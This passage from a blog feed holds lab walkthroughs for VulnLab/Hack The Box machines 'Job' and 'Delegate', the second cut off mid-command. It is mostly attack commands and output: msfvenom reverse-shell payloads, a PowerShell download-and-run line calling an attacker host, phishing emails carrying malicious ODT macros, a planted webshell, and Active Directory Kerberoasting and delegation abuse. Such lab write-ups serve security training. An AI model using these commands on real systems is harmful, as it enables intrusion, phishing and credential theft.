work):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure><p>Started Metasploit console:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 9091</span><br></pre></td></tr></table></figure><p>After obtaining a system session, I simply ran:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><p><img src="/images/Media/systemshell.png" alt="System Shell"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c">https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Job</title>
      <link href="/2025/04/02/VL-Job/"/>
      <url>/2025/04/02/VL-Job/</url>
      
        <content type="html"><![CDATA[<h1 id="Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><a href="#Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server" class="headerlink" title="Job: Exploiting Document Macros to Compromise Windows Web Server"></a>Job: Exploiting Document Macros to Compromise Windows Web Server</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can lead to full system compromise of a Windows-based web server. Starting with IIS short name vulnerability discovery, we leverage a job application portal’s request for LibreOffice documents to deliver malicious macros that establish initial access. The walkthrough progresses through lateral movement by exploiting developer group permissions to plant web shells, followed by service impersonation techniques for privilege escalation to SYSTEM. This step-by-step pentesting guide highlights the dangers of processing untrusted documents, insufficient application security controls, and improper service configurations in corporate environments.</p><h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><p>Initial port scan revealed several open ports:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Job.local</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br></pre></td></tr></table></figure><h2 id="Vulnerability-Discovery"><a href="#Vulnerability-Discovery" class="headerlink" title="Vulnerability Discovery"></a>Vulnerability Discovery</h2><p>After noticing the IIS server, I decided to check for the IIS short name vulnerability using a specialized scanning tool:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar iis_shortname_scanner.jar 2 20 http://10.10.94.31/</span><br></pre></td></tr></table></figure><p>The scan revealed the server is vulnerable and identified some files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Scanning...</span><br><span class="line"></span><br><span class="line">Testing request method: &quot;OPTIONS&quot; with magic part: &quot;/~1/.rem&quot; ...</span><br><span class="line">Early result: the target is probably vulnerable.</span><br><span class="line">Early result: identified letters in names &gt; A,D,E,H,I,L,N,O,P,S,T,X</span><br><span class="line">Early result: identified letters in extensions &gt; A,H,M,P,S,T</span><br><span class="line">File: HELLO~1.ASP</span><br><span class="line">Dir: ASPNET~1</span><br><span class="line">File: INDEX~1.HTM</span><br><span class="line">[\] INDEX~1.HTT</span><br><span class="line"># IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2025/04/02 17:40:37</span><br><span class="line">Target: http://10.10.94.31/</span><br><span class="line">|_ Result: Vulnerable!</span><br><span class="line">|_ Used HTTP method: OPTIONS</span><br><span class="line">|_ Suffix (magic part): /~1/.rem</span><br><span class="line">|_ Extra information:</span><br><span class="line">  |_ Number of sent requests: 444</span><br><span class="line">  |_ Identified directories: 1</span><br><span class="line">    |_ ASPNET~1</span><br><span class="line">  |_ Identified files: 2</span><br><span class="line">    |_ HELLO~1.ASP</span><br><span class="line">      |_ Actual file name = HELLO</span><br><span class="line">    |_ INDEX~1.HTM</span><br><span class="line">      |_ Actual file name = INDEX</span><br></pre></td></tr></table></figure><p>Using the discovered information, I accessed the HELLO.ASPX file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.94.31/HELLO.ASPX             </span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;./HELLO.ASPX&quot; id=&quot;form1&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; id=&quot;__VIEWSTATE&quot; value=&quot;/wEPDwUKLTg0NTYxMzIxNWRksO0e53iBgOk1F32mZVsjTztyPJmhrJc1OInj8vzB5Gk=&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATEGENERATOR&quot; id=&quot;__VIEWSTATEGENERATOR&quot; value=&quot;D4124C05&quot; /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line"></span><br><span class="line">        Hello World</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>I discovered a message on the website stating: “Please send your application to <a href="mailto:&#x63;&#x61;&#114;&#x65;&#x65;&#x72;&#64;&#x6a;&#x6f;&#x62;&#46;&#x6c;&#111;&#99;&#97;&#x6c;">career@job.local</a>! We recently switched to using open source products - please send your cv as a libre office document.”</p><h2 id="Initial-Access-Strategy"><a href="#Initial-Access-Strategy" class="headerlink" title="Initial Access Strategy"></a>Initial Access Strategy</h2><p>This presented an opportunity for exploitation through malicious ODT files. I decided to use Metasploit’s ODT template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use fileformat/odt_badodt</span><br></pre></td></tr></table></figure><p>To capture hashes, I set up Responder:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p>Then sent a malicious ODT file via email:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swaks --to career@job.local --from fake@example.com --server 10.10.94.31 --attach @/root/.msf4/local/bad.odt --header &quot;Application&quot; --body &quot;Hello i am a softwere developer and I would like to apply for the job&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Job/foothold.png" alt="Successfully obtained a user hash"><br>After capturing the hash, I attempted to crack it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash9099.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat                                </span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: JACK.BLACK::JOB:16c1cb50aabefdf2:b4ad21b5ac50c9dc89...000000</span><br><span class="line">Time.Started.....: Wed Apr  2 18:41:19 2025 (7 secs)</span><br><span class="line">Time.Estimated...: Wed Apr  2 18:41:26 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:  2066.3 kH/s (1.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)</span><br><span class="line">Progress.........: 14344385/14344385 (100.00%)</span><br><span class="line">Rejected.........: 0/14344385 (0.00%)</span><br><span class="line">Restore.Point....: 14344385/14344385 (100.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line">Hardware.Mon.#1..: Temp: 66c Util: 69%</span><br></pre></td></tr></table></figure><p>Unfortunately, the hash cracking attempt was unsuccessful.</p><h2 id="Alternative-Approach-Macro-Exploitation"><a href="#Alternative-Approach-Macro-Exploitation" class="headerlink" title="Alternative Approach - Macro Exploitation"></a>Alternative Approach - Macro Exploitation</h2><p>I decided to create a malicious LibreOffice macro:<br><img src="/images/Job/macro1.png" alt="Macro creation part 1"><br><img src="/images/Job/macro2.png" alt="Macro creation part 2"><br><img src="/images/Job/marco3.png" alt="Macro creation part 3"><br><img src="/images/Job/macro4.png" alt="Macro creation part 4"><br><img src="/images/Job/marco4.png" alt="Macro creation part 5"></p><h2 id="Getting-a-Shell"><a href="#Getting-a-Shell" class="headerlink" title="Getting a Shell"></a>Getting a Shell</h2><p>I set up a HoaxShell listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --p 4444</span><br></pre></td></tr></table></figure><p><img src="/images/Job/hoaxhsell.png" alt="HoaxShell listener ready"></p><p>Alternatively, we can create a DSVyper shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f raw -o shell.bin</span><br></pre></td></tr></table></figure><p><img src="/images/Job/dsvyper.png" alt="DSVyper shell creation"><br>For the macro, we’d use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(IWR http://10.8.5.195/shell.exe -UseBasicParsing);</span><br></pre></td></tr></table></figure><p>I sent the email with the malicious ODT file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to career@job.local --header &quot;Application CV&quot; --body &quot;Hello, I&#x27;m a software developer and i am searching for a job, please review my application.&quot; --attach @hello.odt --server 10.10.94.31</span><br></pre></td></tr></table></figure><p><img src="/images/Job/shellback2.png" alt="Successful shell callback"></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>I attempted reconnaissance using PowerUp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jack.black\Desktop &gt; curl http://10.8.5.195/PowerUp.ps1 -o PowerUp.ps1</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; dir</span><br><span class="line">Directory: C:\Users\jack.black\Desktop</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; Import-Module ./PowerUp.ps1</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; Invoke-AllChecks</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Results showed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HijackablePath : C:\Users\jack.black\AppData\Local\Microsoft\WindowsApps\                                                                                                                                                                   </span><br><span class="line">AbuseFunction  : Write-HijackDll -OutputFile &#x27;C:\Users\jack.black\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll&#x27;          </span><br><span class="line">-Command &#x27;...&#x27; </span><br></pre></td></tr></table></figure><p>This approach didn’t yield results.<br>I noticed that user jack.black is in the developers group, which meant we could modify the webpage. I placed a webshell in the <code>wwwroot</code> folder:<br><img src="/images/Job/webshell.png" alt="Webshell creation"><br><img src="/images/Job/web-shell.png" alt="Web shell in action"><br>Set up another HoaxShell listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --port 4433</span><br></pre></td></tr></table></figure><p>I pasted the HoaxShell command and got a new shell:<br><img src="/images/Job/impersonate.png" alt="Impersonating as web service"></p><h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>For obtaining full system access, I generated a Meterpreter payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure><p>I uploaded the payload and set up a multi&#x2F;handler:<br><img src="/images/Job/mulit-handler.png" alt="Meterpreter multi&#x2F;handler setup"><br>With the Meterpreter session established, I was able to escalate to SYSTEM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1828 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.20348.350]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The Job machine was successfully compromised by exploiting:</p><ol><li>A vulnerability in how the server processes LibreOffice documents</li><li>Web server write permissions available to the compromised user</li><li>Service impersonation techniques for privilege escalation</li></ol><p><a href="https://api.vulnlab.com/api/v1/share?id=4fcb82b4-05e4-4b83-ac24-42fdc137a063">https://api.vulnlab.com/api/v1/share?id=4fcb82b4-05e4-4b83-ac24-42fdc137a063</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Delegate</title>
      <link href="/2025/04/02/VL-Delegate/"/>
      <url>/2025/04/02/VL-Delegate/</url>
      
        <content type="html"><![CDATA[<h1 id="Delegate-Exploiting-Active-Directory-Delegation-for-Domain-Takeover"><a href="#Delegate-Exploiting-Active-Directory-Delegation-for-Domain-Takeover" class="headerlink" title="Delegate: Exploiting Active Directory Delegation for Domain Takeover"></a>Delegate: Exploiting Active Directory Delegation for Domain Takeover</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Delegate” machine, we demonstrate how misconfigured Active Directory delegation settings can lead to complete domain compromise. Beginning with a null SMB session that reveals initial credentials, we leverage GenericWrite permissions to perform targeted Kerberoasting against a privileged user. The walkthrough progresses through advanced Active Directory attack techniques including machine account creation, DNS record manipulation, and unconstrained delegation exploitation to ultimately capture authentication tickets and extract domain secrets. This step-by-step pentesting guide highlights the critical security risks associated with delegation privileges in Windows domains and the importance of properly securing Active Directory configurations.</p><h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65510 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server </span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-04-01T16:43:27+00:00; -1h59m53s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC1.delegate.vl</span><br><span class="line">| Issuer: commonName=DC1.delegate.vl</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">49664/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49665/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49667/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49669/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49672/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49683/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49685/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64567/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64591/tcp open  unknown       syn-ack ttl 127</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We can get access to the SMB server via a null session:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.64.93 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/smb_guest.png" alt="SMB Guest Access"></p><p>After gaining access to the NETLOGON share, we find a <code>users.bat</code> file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.64.93/NETLOGON</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get users.bat</span><br></pre></td></tr></table></figure><p>Opening that file reveals credentials for what appears to be an Administrator account, as the command will run when the username is A.Briggs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings users.bat</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/strings.png" alt="Strings Output"></p><p>The password didn’t work for Administrator but worked for A.Briggs. This gave us access to LDAP, so the next step was running BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/foothold.png" alt="Initial Foothold"></p><h2 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h2><p>After analyzing the domain structure, we discovered that we have GenericWrite permissions over N.Thompson, who also has PSRemote access to the Domain Controller - a promising attack path:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.64.93 -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --bloodhound --dns-server 10.10.64.93 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/path.png" alt="Attack Path"></p><h3 id="Exploiting-GenericWrite"><a href="#Exploiting-GenericWrite" class="headerlink" title="Exploiting GenericWrite"></a>Exploiting GenericWrite</h3><p>We abused the GenericWrite permissions using targeted Kerberoasting to obtain N.Thompson’s hash and crack the password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 targetedKerberoast.py -v -d &#x27;delegate.vl&#x27; -u &#x27;a.briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/delegate.png" alt="Kerberoast Results"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash9090.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/cracked_hash.png" alt="Cracked Hash"></p><p>Now we could connect to the machine using WinRM and retrieve the user flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.64.93 -u N.Thompson -p KALEB_2341</span><br></pre></td></tr></table></figure><h2 id="Unconstrained-Delegation-Exploitation"><a href="#Unconstrained-Delegation-Exploitation" class="headerlink" title="Unconstrained Delegation Exploitation"></a>Unconstrained Delegation Exploitation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/delegation_priv.png" alt="Delegation Privileges"></p><p>According to <a href="https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">HarmJ0y’s blog</a>, this GPO is located at <strong>\DOMAIN\sysvol\testlab.local\Policies{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</strong>. By adding any user SID or username to the <strong>SeEnableDelegationPrivilege</strong> line of the <strong>[Privilege Rights]</strong> section, the setting will take hold whenever the user&#x2F;machine’s current DC reboots or refreshes its group policy.</p><p>This means we can abuse unconstrained delegation by creating a machine account and appending a Service Principal Name (SPN) to it. First, we need to check if the machine quota isn’t set to 0:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap delegate.vl -u N.Thompson -p  -M maq</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/machine_acc.png" alt="Machine Account Quota"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer -dc-ip 10.10.64.93 -computer-pass HelloWorld123 -computer-name Evil delegate.vl/N.Thompson:&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>Next, we add a DNS record for the machine account we created using <a href="https://github.com/dirkjanm/krbrelayx/tree/master">krbrelayx</a>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u &#x27;delegate.vl\Evil$&#x27; -p HelloWorld123 -r Evil.delegate.vl -d 10.8.5.195 --action add DC1.delegate.vl -dns-ip 10.10.64.93</span><br></pre></td></tr></table></figure><p>To abuse unconstrained delegation, the machine account needs to have an SPN and <code>TRUSTED_FOR_DELEGATION</code> UAC. We can add the UAC using <code>bloodyAD</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC1.delegate.vl -u &#x27;N.Thompson&#x27; -p &#x27;&#x27; -d &#x27;delegate.vl&#x27; add uac &#x27;Evil$&#x27; -f TRUSTED_FOR_DELEGATION</span><br></pre></td></tr></table></figure><p>Now we append an SPN with <code>addspn</code> via <code>msDS-AdditionalDnsHostName</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s CIFS/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">DN: CN=Evil,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-04-01T20:40:40.003792</span><br><span class="line">    msDS-AdditionalDnsHostName: Evil.delegate.vl</span><br><span class="line">    sAMAccountName: Evil$</span><br><span class="line">    servicePrincipalName: cifs/Evil.delegate.vl</span><br></pre></td></tr></table></figure><p>Additionally, we’ll add a HOST SPN on the machine we’ve created:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s HOST/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93 